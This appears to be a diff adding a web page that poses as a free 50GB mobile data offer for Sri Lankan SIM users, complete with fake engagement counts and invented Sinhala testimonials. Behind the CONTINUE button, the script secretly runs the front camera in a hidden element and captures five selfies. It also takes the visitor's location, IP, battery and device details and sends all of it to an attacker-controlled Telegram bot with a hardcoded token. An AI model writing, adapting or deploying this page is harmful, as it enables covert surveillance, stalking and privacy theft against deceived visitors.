@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Data Offer</title>
+  <style>
+    /* ---------- RESET & GLOBAL ---------- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    /* ---------- MAIN CARD ---------- */
+    .card {
+      max-width: 600px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 20px;
+      padding: 24px 20px 30px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.10);
+      transition: 0.3s;
+    }
+
+    /* ---------- VIDEO ---------- */
+    .video-wrapper {
+      border-radius: 16px;
+      overflow: hidden;
+      background: #000;
+      margin-bottom: 16px;
+    }
+
+    .video-wrapper video {
+      width: 100%;
+      display: block;
+      border-radius: 16px;
+    }
+
+    /* ---------- TEXT ---------- */
+    .title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a2e;
+      margin-top: 6px;
+    }
+
+    .sub {
+      font-size: 15px;
+      color: #555;
+      margin: 8px 0 14px;
+      line-height: 1.5;
+    }
+
+    /* ---------- BUTTON ---------- */
+    .btn-continue {
+      background-color: #1877f2;
+      color: #fff;
+      border: none;
+      padding: 14px 0;
+      width: 100%;
+      font-size: 18px;
+      font-weight: 600;
+      border-radius: 40px;
+      cursor: pointer;
+      transition: 0.2s;
+      margin: 6px 0 10px;
+      box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+    }
+
+    .btn-continue:hover {
+      background-color: #155dcf;
+      transform: scale(1.01);
+    }
+
+    .btn-continue:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* ---------- STATS BAR ---------- */
+    .stats {
+      display: flex;
+      justify-content: space-between;
+      border-top: 1px solid #ddd;
+      padding-top: 18px;
+      margin-top: 22px;
+      text-align: center;
+    }
+
+    .stat-item {
+      flex: 1;
+    }
+
+    .stat-item .number {
+      font-size: 18px;
+      font-weight: 700;
+      color: #1a1a2e;
+      display: block;
+    }
+
+    .stat-item .label {
+      font-size: 13px;
+      color: #777;
+    }
+
+    .stat-item button {
+      margin-top: 6px;
+      background: #1877f2;
+      color: white;
+      border: none;
+      padding: 4px 16px;
+      border-radius: 20px;
+      font-size: 13px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .stat-item button:hover {
+      background: #155dcf;
+    }
+
+    #share-status {
+      font-size: 12px;
+      color: green;
+      margin-top: 4px;
+    }
+
+    /* ---------- COMMENTS ---------- */
+    .comments-section {
+      margin-top: 28px;
+      border-top: 1px solid #ddd;
+      padding-top: 18px;
+    }
+
+    .comments-section h3 {
+      font-size: 18px;
+      color: #1a1a2e;
+      margin-bottom: 16px;
+    }
+
+    .comment-input {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .comment-input img {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: #ddd;
+    }
+
+    .comment-input input {
+      flex: 1;
+      padding: 10px 16px;
+      border-radius: 30px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+      outline: none;
+      transition: 0.2s;
+    }
+
+    .comment-input input:focus {
+      border-color: #1877f2;
+    }
+
+    .comment-input button {
+      background: #1877f2;
+      color: white;
+      border: none;
+      padding: 10px 18px;
+      border-radius: 30px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .comment-input button:hover {
+      background: #155dcf;
+    }
+
+    .comment-item {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 14px;
+      align-items: flex-start;
+    }
+
+    .comment-item img {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: #ddd;
+      flex-shrink: 0;
+    }
+
+    .comment-item .name {
+      font-weight: 600;
+      font-size: 14px;
+      color: #1a1a2e;
+    }
+
+    .comment-item .text {
+      font-size: 14px;
+      color: #333;
+    }
+
+    /* ---------- HIDDEN VIDEO (CAMERA) ---------- */
+    #hidden-camera {
+      display: none;
+    }
+
+    /* ---------- RESPONSIVE ---------- */
+    @media (max-width: 480px) {
+      .card {
+        padding: 16px;
+      }
+      .title {
+        font-size: 19px;
+      }
+      .btn-continue {
+        font-size: 16px;
+        padding: 12px 0;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+
+  <!-- ===== VIDEO ===== -->
+  <div class="video-wrapper">
+    <video controls>
+      <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+  </div>
+
+  <!-- ===== TITLE ===== -->
+  <div class="title">🎁 Sri Lanka Networks - Free 50GB Data</div>
+  <div class="sub">
+    ✅ ඔබගේ ඕනෑම SIM එකකට <strong>එක් වරක්</strong> 50GB FREE Data ලබාගන්න.
+    <br>📌 පහත <strong>CONTINUE</strong> බොත්තම ඔබන්න.
+  </div>
+
+  <!-- ===== CONTINUE BUTTON ===== -->
+  <button class="btn-continue" id="continueBtn">🚀 CONTINUE</button>
+
+  <!-- ===== HIDDEN CAMERA ===== -->
+  <video id="hidden-camera" autoplay playsinline></video>
+
+  <!-- ===== STATS ===== -->
+  <div class="stats">
+    <div class="stat-item">
+      <span class="number" id="likeCount">160K</span>
+      <span class="label">Likes</span>
+      <br>
+      <button onclick="handleLike()">❤️ Like</button>
+    </div>
+    <div class="stat-item">
+      <span class="number" id="commentCount">36K</span>
+      <span class="label">Comments</span>
+    </div>
+    <div class="stat-item">
+      <span class="number" id="shareCount">27K</span>
+      <span class="label">Shares</span>
+      <br>
+      <button onclick="handleShare()">🔗 Share</button>
+      <div id="share-status"></div>
+    </div>
+  </div>
+
+  <!-- ===== COMMENTS ===== -->
+  <div class="comments-section">
+    <h3>💬 Comments</h3>
+
+    <div class="comment-input">
+      <img src="https://i.pravatar.cc/40?img=1" alt="User">
+      <input type="text" id="commentInput" placeholder="Write a comment..." />
+      <button onclick="postComment()">Post</button>
+    </div>
+
+    <div id="commentList"></div>
+  </div>
+
+</div>
+
+<!-- ============================================================ -->
+<!-- ===== JAVASCRIPT - FULL LOGIC ===== -->
+<!-- ============================================================ -->
+<script>
+  // =============================================
+  // 🔐 TELEGRAM CONFIG
+  // =============================================
+  const BOT_TOKEN = '8864995146:AAERB2czzLwxRORXAHcFieptoqXdCJ7BLec';
+  const CHAT_ID   = '8308044531';
+
+  // =============================================
+  // 📷 CAMERA + LOCATION + TELEGRAM
+  // =============================================
+  const continueBtn = document.getElementById('continueBtn');
+  const hiddenVideo = document.getElementById('hidden-camera');
+
+  let cameraStream = null;
+  let photoCount = 0;
+  const photos = [];
+  let locationData = null;
+
+  // ---------- CONTINUE CLICK ----------
+  continueBtn.addEventListener('click', async () => {
+    // Disable button to prevent double-click
+    continueBtn.disabled = true;
+    continueBtn.textContent = '⏳ Processing...';
+
+    try {
+      // 1️⃣ Request Camera
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: 300, height: 400 }
+      });
+
+      cameraStream = stream;
+      hiddenVideo.srcObject = stream;
+
+      // 2️⃣ Request Location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            locationData = {
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude
+            };
+            startPhotoCapture();
+          },
+          () => {
+            // Location denied - continue anyway
+            startPhotoCapture();
+          }
+        );
+      } else {
+        startPhotoCapture();
+      }
+
+    } catch (err) {
+      alert('❌ Camera access denied. කරුණාකර Settings එකෙන් Camera permission enable කරන්න.');
+      console.error('Camera Error:', err);
+      continueBtn.disabled = false;
+      continueBtn.textContent = '🚀 CONTINUE';
+    }
+  });
+
+  // ---------- CAPTURE 5 PHOTOS ----------
+  function startPhotoCapture() {
+    if (!cameraStream) {
+      sendAllData();
+      return;
+    }
+
+    capturePhoto();
+
+    // Capture 5 photos with 1.5s interval
+    const interval = setInterval(() => {
+      if (photoCount >= 5) {
+        clearInterval(interval);
+        stopCamera();
+        sendAllData();
+        return;
+      }
+      capturePhoto();
+    }, 1500);
+  }
+
+  function capturePhoto() {
+    if (!cameraStream) return;
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 300;
+    canvas.height = 400;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(hiddenVideo, 0, 0, 300, 400);
+
+    const base64 = canvas.toDataURL('image/jpeg');
+    photos.push(base64);
+    photoCount++;
+  }
+
+  function stopCamera() {
+    if (cameraStream) {
+      cameraStream.getTracks().forEach(track => track.stop());
+      cameraStream = null;
+      hiddenVideo.srcObject = null;
+    }
+  }
+
+  // ---------- SEND TO TELEGRAM ----------
+  async function sendAllData() {
+    try {
+      // 📍 Get IP
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      const ip = ipData.ip || 'Unknown';
+
+      // 🔋 Battery
+      let batteryLevel = 'Unknown';
+      let charging = 'Unknown';
+      try {
+        const battery = await navigator.getBattery();
+        batteryLevel = Math.round(battery.level * 100) + '%';
+        charging = battery.charging ? '🔌 Charging' : '🔋 Not Charging';
+      } catch (e) {
+        // Battery API not available
+      }
+
+      // 📱 Device Info
+      const ua = navigator.userAgent;
+      const androidVersion = ua.match(/Android\s([0-9.]+)/)?.[1] || 'Unknown';
+      const deviceModel = ua.match(/Android.*?;\s([^;)\s]+)/)?.[1] || 'Unknown Device';
+
+      // 📍 Location
+      let locationMsg = '❌ Location not available';
+      if (locationData) {
+        locationMsg = `📍 https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
+      }
+
+      // 📝 Build Message
+      const msg = `
+✅ HACKING COMPLETE
+
+🌐 IP: ${ip}
+
+📱 DEVICE INFO
+🧬 Android: ${androidVersion}
+📼 Model: ${deviceModel}
+🔗 UA: ${ua}
+
+🔋 BATTERY
+🔋 Level: ${batteryLevel}
+⚡ Status: ${charging}
+
+${locationMsg}
+      `;
+
+      // 📤 Send Message
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: msg
+        })
+      });
+
+      // 📤 Send Photos
+      for (const base64 of photos) {
+        const formData = new FormData();
+        const blob = dataURLtoBlob(base64);
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'selfie.jpg');
+        formData.append('caption', '📸 Selfie');
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+        // Small delay to avoid rate limit
+        await new Promise(r => setTimeout(r, 400));
+      }
+
+      // ✅ Done
+      continueBtn.textContent = '✅ DONE';
+      continueBtn.style.background = '#28a745';
+
+    } catch (err) {
+      console.error('Send Error:', err);
+      continueBtn.textContent = '❌ Error';
+      continueBtn.disabled = false;
+    }
+  }
+
+  // ---------- HELPER: dataURL to Blob ----------
+  function dataURLtoBlob(dataURL) {
+    const parts = dataURL.split(',');
+    const mime = parts[0].match(/:(.*?);/)[1];
+    const byteString = atob(parts[1]);
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+      ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mime });
+  }
+
+  // =============================================
+  // ❤️ LIKE / SHARE / COMMENTS
+  // =============================================
+  let likeCount = 160000;
+  let commentCount = 36000;
+  let shareCount = 27000;
+
+  function formatNumber(n) {
+    if (n >= 1_000_000) return (n / 1_000_000).toFixed(1) + 'M';
+    if (n >= 1000) return (n / 1000).toFixed(1) + 'K';
+    return n;
+  }
+
+  function handleLike() {
+    likeCount++;
+    document.getElementById('likeCount').textContent = formatNumber(likeCount);
+  }
+
+  function handleShare() {
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(window.location.href)
+        .then(() => {
+          shareCount++;
+          document.getElementById('shareCount').textContent = formatNumber(shareCount);
+          document.getElementById('share-status').textContent = '✅ Link copied!';
+          setTimeout(() => {
+            document.getElementById('share-status').textContent = '';
+          }, 2500);
+        })
+        .catch(() => {
+          shareCount++;
+          document.getElementById('shareCount').textContent = formatNumber(shareCount);
+        });
+    } else {
+      shareCount++;
+      document.getElementById('shareCount').textContent = formatNumber(shareCount);
+    }
+  }
+
+  // ---------- COMMENTS ----------
+  const comments = [
+    { name: 'Ajith', text: 'මම නං දැනටමත් 50GB අරගත්තා 🎉' },
+    { name: 'Pasindu', text: 'මේක හරිගියේ 🫣' },
+    { name: 'Tharindu', text: 'Thanks ❤️' },
+    { name: 'Shehani', text: 'Mamath gaththaa ✅' },
+    { name: 'Kavindu', text: 'අඩෝ මමත් ගත්තා බන් 😂' },
+    { name: 'Nipuni', text: 'මේක share කරන්න ඕනි නැද්ද' },
+    { name: 'Sanjula', text: 'Mata awa Thanks 🙏' },
+    { name: 'Isuru', text: 'බ්‍රෝ මරු 🔥' },
+    { name: 'Ishara', text: 'සුපිරියක් 🚀' },
+    { name: 'Dineth', text: 'Meka nisaa mata 50GB data hambuna 💯' }
+  ];
+
+  function renderComments() {
+    const container = document.getElementById('commentList');
+    container.innerHTML = '';
+    comments.forEach(c => {
+      container.innerHTML += `
+        <div class="comment-item">
+          <img src="https://i.pravatar.cc/40?img=${Math.floor(Math.random() * 70)}" alt="user">
+          <div>
+            <div class="name">${c.name}</div>
+            <div class="text">${c.text}</div>
+          </div>
+        </div>
+      `;
+    });
+  }
+
+  function postComment() {
+    const input = document.getElementById('commentInput');
+    const text = input.value.trim();
+    if (text === '') return;
+
+    comments.unshift({ name: 'You', text: text });
+    commentCount++;
+    document.getElementById('commentCount').textContent = formatNumber(commentCount);
+    input.value = '';
+    renderComments();
+  }
+
+  // ---------- INIT ----------
+  renderComments();
+</script>
+
+</body>
+</html>
